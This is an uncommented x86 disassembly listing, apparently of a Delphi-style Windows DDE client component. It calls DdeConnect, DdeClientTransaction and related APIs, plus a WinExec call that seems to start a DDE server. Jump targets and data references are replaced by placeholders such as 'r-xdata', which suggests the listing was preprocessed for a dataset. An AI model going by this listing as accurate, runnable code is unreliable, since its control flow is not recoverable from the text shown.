mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_484f1c
mov edx ebx
mov eax esi
call sub_4851c0
mov edx edi
mov eax esi
call sub_4851d4
mov eax esi
call sub_484d28
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_4851c0
xor edx edx
mov eax esi
call sub_4851d4
sub_484d28
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push j_sub_403a2c#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484f05
lea eax [ ebp - 0x108 ]
call sub_4040ac
retn
mov eax [ edi + 0x30 ]
call sub_40436c
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_40436c
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_4089a0
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_484f9c
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_484fdc
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_4089a0
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_40436c
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_484f9c
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_40436c
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_40436c
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_40442c
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_4089a0
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_4089a0
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_4034ac
xor ecx ecx
xor edx edx
mov eax edi
call sub_485100
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_485054
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_484fdc
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_484f1c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_4850bc
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_4851c0
xor edx edx
mov eax ebx
call sub_4851d4
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_484f9c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_4189b0
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_485398
dec bx
jne r-xdata
sub_484fdc
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402cc4
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_485054
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_4189b0
mov edi eax
mov eax edi
call sub_48571c
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_485398
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_4850bc
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_4034ac
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_4189b0
call sub_485814
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_485100
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_4189b0
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_4855c8
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_485140
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_40436c
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_40436c
test eax eax
je r-xdata
mov eax esi
call sub_484d28
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_485228
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_42168c
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_4189b0
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_485398
inc esi
sub_48529c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4852e0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_485310
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48538b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485392
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_404144
lea eax [ ebx + 0x38 ]
call sub_4040ac
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_484bd0
mov edx ebx
call sub_421440
mov eax [ ebp - 0x4 ]
call sub_40436c
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_485398
sub_485398
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_404100
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_484c08
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_404100
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_4040ac
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_4853f4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_484bd0
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_4040ac
sub_485430
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4034c4
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_485478
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_4040ac
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_4854ac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4854f0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_4857d4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_48551c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4855b9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404144
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_404100
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_40436c
test eax eax
je r-xdata
mov eax esi
call sub_4857d4
mov eax esi
call sub_4856a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4855c0
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_48571c
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_4040ac
jmp r-xdata
sub_4855c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a2c#7
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_48570c
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_4042a4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_4856a4
jmp r-xdata
mov eax ebx
call sub_485834
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_485714
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48569c
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov eax [ ebp - 0x8 ]
call sub_40436c
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_404578
mov [ eax + esi - 0x1 ] 0x20
sub_4856a4
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_485834
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_4855c8
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_48571c
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_40436c
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_4857d4
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_485814
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_485814
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_485840
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_48588c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_4858cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_4040ac
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_4858f8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_4859a8
pop esi
pop ebx
retn
sub_485924
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_485998
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_408078
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48599f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_4859a8
sub_4859a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push j_sub_403a2c#6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_48480c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485a36
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44f854
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_48480c
sub_485a3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a2c#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485ac6
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_4042a4
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_4859a8
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_485ae4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_42168c
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_485b0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov edx esi
mov eax [ rw-data ]
call sub_484870
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_485b50
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_484884
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_485b84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_485c0f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485c16
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4042a4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_485c48
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_485c8c
push ebx
push esi
push edi
push ebp
call sub_403664
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_4032b0
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4213bc
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4189b0
call sub_4032b0
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40364c
sub_485d10
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_485e30
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485e37
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_4040d0
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_40431c
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_48605c
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4861d4
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_40431c
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_486330
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_418854
mov edx ebx
mov eax esi
call sub_421440
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_485e44
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_486180
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_418b4c
mov eax ebx
call sub_4032b0
sub_485e74
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_485f17
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485f1e
lea eax [ ebp - 0x1004 ]
call sub_4040ac
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_40431c
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_48605c
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_485a3c
mov esi eax
sub_485f28
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_485b84
mov edx eax
sub_485f48
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push j_sub_403a2c#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
